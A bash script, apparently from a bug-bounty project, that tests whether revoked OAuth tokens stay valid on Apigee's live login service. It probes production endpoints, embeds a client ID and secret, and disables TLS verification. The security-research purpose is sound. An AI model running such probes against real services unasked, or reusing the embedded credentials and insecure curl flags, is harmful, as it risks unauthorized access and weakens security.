#!/bin/bash
# Test CVE-2026-22723: Token revocation logic bypass
# Tests if revoked tokens remain valid after explicit revocation
# Requires: access token in TOKEN_FILE from apigee_mgmt_auth.sh
export PATH="/usr/bin:/usr/local/bin:/usr/sbin:/bin:$PATH"

OUTDIR="$HOME/bug-bounty-hunting-/results/apigee/03-candidates"
TOKEN_FILE="/tmp/apigee_mgmt_token.json"
OUT="$OUTDIR/APG-L004-token-revoke.txt"
mkdir -p "$OUTDIR"

echo "=== CVE-2026-22723: Token Revocation Bypass Test ===" | tee "$OUT"
echo "Date: $(date -u)" | tee -a "$OUT"
echo | tee -a "$OUT"

# Get token (run apigee_mgmt_auth.sh first, or set APIGEE_TOKEN)
ACCESS_TOKEN="${APIGEE_TOKEN:-$(python3 -c "import json; d=json.load(open('$TOKEN_FILE')); print(d.get('access_token',''))" 2>/dev/null)}"
if [ -z "$ACCESS_TOKEN" ]; then
  echo "ERROR: No token. Run apigee_mgmt_auth.sh first or set APIGEE_TOKEN env var."
  exit 1
fi
echo "Token: ${ACCESS_TOKEN:0:30}..." | tee -a "$OUT"

# Get JTI (token ID) for targeted revocation
echo "--- Get token JTI via /check_token ---" | tee -a "$OUT"
CHECK=$(/usr/bin/curl -sk --max-time 10 \
  -u "edgecli:edgeclisecret" \
  -X POST "https://login.apigee.com/check_token" \
  -d "token=${ACCESS_TOKEN}")
echo "$CHECK" | python3 -m json.tool 2>/dev/null | tee -a "$OUT"
JTI=$(echo "$CHECK" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('jti',''))" 2>/dev/null)
echo "JTI: $JTI" | tee -a "$OUT"
echo | tee -a "$OUT"

# Step 1: Verify token works before revocation
echo "--- Pre-revocation: verify token is valid ---" | tee -a "$OUT"
PRE=$(/usr/bin/curl -sk --max-time 10 \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -w "\nHTTP_%{http_code}" \
  "https://login.apigee.com/userinfo")
echo "Pre-revoke /userinfo: $PRE" | tee -a "$OUT"
echo | tee -a "$OUT"

# Step 2: Revoke the token
echo "--- Revoking token via /oauth/token/revoke ---" | tee -a "$OUT"
if [ -n "$JTI" ]; then
  REVOKE=$(/usr/bin/curl -sk --max-time 10 \
    -H "Authorization: Bearer $ACCESS_TOKEN" \
    -X DELETE "https://login.apigee.com/oauth/token/revoke/${JTI}" \
    -w "\nHTTP_%{http_code}")
else
  REVOKE=$(/usr/bin/curl -sk --max-time 10 \
    -u "edgecli:edgeclisecret" \
    -X POST "https://login.apigee.com/oauth/token/revoke" \
    -d "token=${ACCESS_TOKEN}" \
    -w "\nHTTP_%{http_code}")
fi
echo "Revoke response: $REVOKE" | tee -a "$OUT"
echo | tee -a "$OUT"

# Step 3: Try to use revoked token (should 401, bug if 200)
echo "--- Post-revocation: try to use revoked token (should be 401) ---" | tee -a "$OUT"
POST=$(/usr/bin/curl -sk --max-time 10 \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -w "\nHTTP_%{http_code}" \
  "https://login.apigee.com/userinfo")
echo "Post-revoke /userinfo: $POST" | tee -a "$OUT"
echo | tee -a "$OUT"

echo "=== VERDICT ===" | tee -a "$OUT"
POST_CODE=$(echo "$POST" | /usr/bin/grep -oE 'HTTP_[0-9]+' | tail -1)
if echo "$POST_CODE" | /usr/bin/grep -q "200"; then
  echo "*** POTENTIAL CVE-2026-22723: Revoked token still returns 200! ***" | tee -a "$OUT"
  echo "*** Document this immediately and write VRP report ***" | tee -a "$OUT"
elif echo "$POST_CODE" | /usr/bin/grep -q "401"; then
  echo "Token properly revoked (401 returned). CVE-2026-22723 patched or not applicable." | tee -a "$OUT"
else
  echo "Unexpected response code: $POST_CODE — inspect manually." | tee -a "$OUT"
fi
echo
echo "Done. Results: $OUT"
